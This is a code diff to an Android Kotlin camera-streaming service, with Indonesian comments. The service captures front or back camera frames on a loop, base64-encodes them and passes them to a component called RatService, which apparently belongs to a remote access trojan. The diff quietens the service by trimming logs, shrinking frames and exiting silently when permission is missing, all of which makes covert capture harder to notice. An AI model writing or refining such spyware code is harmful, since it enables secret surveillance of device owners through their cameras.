@@ -46,9 +46,17 @@ class CameraStreamService : Service() {
 
         Log.i(TAG, "onStartCommand front=$front")
 
+        // Cek permission — kalau belum granted, STOP tanpa buka kamera (nggak spam popup)
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED) {
-            Log.e(TAG, "❌ CAMERA PERMISSION NOT GRANTED — STOP")
+            Log.e(TAG, "❌ CAMERA PERMISSION NOT GRANTED")
+            stopSelf()
+            return START_NOT_STICKY
+        }
+
+        // Kalau udah streaming, stop dulu
+        if (isStreaming) {
+            Log.i(TAG, "Already streaming — restart")
             stopSelf()
             return START_NOT_STICKY
         }
@@ -86,15 +94,10 @@ class CameraStreamService : Service() {
             val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT
                                else CameraCharacteristics.LENS_FACING_BACK
 
-            Log.i(TAG, "Looking for camera facing=$targetFacing")
-            Log.i(TAG, "Available cameras: ${cm.cameraIdList.joinToString()}")
-
             val cameraId = cm.cameraIdList.firstOrNull { id ->
-                val facing = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
-                Log.i(TAG, "Camera $id facing=$facing")
-                facing == targetFacing
+                cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
             } ?: cm.cameraIdList.firstOrNull() ?: run {
-                Log.e(TAG, "❌ No camera found")
+                Log.e(TAG, "❌ No camera")
                 stopSelf()
                 return
             }
@@ -107,18 +110,16 @@ class CameraStreamService : Service() {
             val chars = cm.getCameraCharacteristics(cameraId)
             val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val size = map?.getOutputSizes(ImageFormat.JPEG)
-                ?.filter { it.width <= 800 && it.height <= 800 }
+                ?.filter { it.width <= 640 && it.height <= 640 }
                 ?.maxByOrNull { it.width * it.height }
                 ?: Size(480, 360)
 
-            Log.i(TAG, "Frame size: ${size.width}x${size.height}")
+            Log.i(TAG, "Frame size ${size.width}x${size.height}")
 
             imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
 
             imageReader!!.setOnImageAvailableListener({ r ->
-                val image = try { r.acquireLatestImage() } catch (e: Exception) {
-                    Log.e(TAG, "acquire error", e); null
-                }
+                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                 if (image != null) {
                     try {
                         val buf: ByteBuffer = image.planes[0].buffer
@@ -127,20 +128,13 @@ class CameraStreamService : Service() {
                         val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
 
                         frameCount++
-                        if (frameCount % 10 == 0) {
-                            Log.i(TAG, "Frame #$frameCount size=${b64.length}")
-                        }
+                        val sent = RatService.instance?.sendFrame(
+                            if (isFront) "cam_front_frame" else "cam_back_frame",
+                            b64
+                        ) ?: false
 
-                        val sent = RatService.instance?.let { svc ->
-                            svc.sendFrame(
-                                if (isFront) "cam_front_frame" else "cam_back_frame",
-                                b64
-                            )
-                            true
-                        } ?: false
-
-                        if (!sent && frameCount % 10 == 0) {
-                            Log.w(TAG, "⚠️ RatService.instance null — frame not sent")
+                        if (frameCount % 20 == 0) {
+                            Log.i(TAG, "Frame #$frameCount sent=$sent size=${b64.length}")
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "Encode error", e)
@@ -157,8 +151,8 @@ class CameraStreamService : Service() {
                     startCaptureLoop()
                 }
                 override fun onDisconnected(camera: CameraDevice) {
-                    Log.w(TAG, "Camera disconnected")
                     camera.close()
+                    stopSelf()
                 }
                 override fun onError(camera: CameraDevice, error: Int) {
                     Log.e(TAG, "❌ Camera error: $error")
@@ -168,7 +162,7 @@ class CameraStreamService : Service() {
             }, handler)
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ startStreaming error", e)
+            Log.e(TAG, "startStreaming error", e)
             stopSelf()
         }
     }
@@ -187,13 +181,14 @@ class CameraStreamService : Service() {
                         loopCapture()
                     }
                     override fun onConfigureFailed(s: CameraCaptureSession) {
-                        Log.e(TAG, "❌ Session config failed")
+                        Log.e(TAG, "❌ Config failed")
+                        stopSelf()
                     }
                 },
                 handler
             )
         } catch (e: Exception) {
-            Log.e(TAG, "❌ startCaptureLoop error", e)
+            Log.e(TAG, "startCaptureLoop error", e)
         }
     }
 
@@ -211,12 +206,12 @@ class CameraStreamService : Service() {
             s.capture(req.build(), null, handler)
             handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
         } catch (e: Exception) {
-            Log.e(TAG, "❌ loopCapture error", e)
+            Log.e(TAG, "loopCapture error", e)
         }
     }
 
     override fun onDestroy() {
-        Log.i(TAG, "onDestroy — total frames=$frameCount")
+        Log.i(TAG, "onDestroy — frames=$frameCount")
         running = false
         isStreaming = false
         try { session?.close() } catch (_: Exception) {}
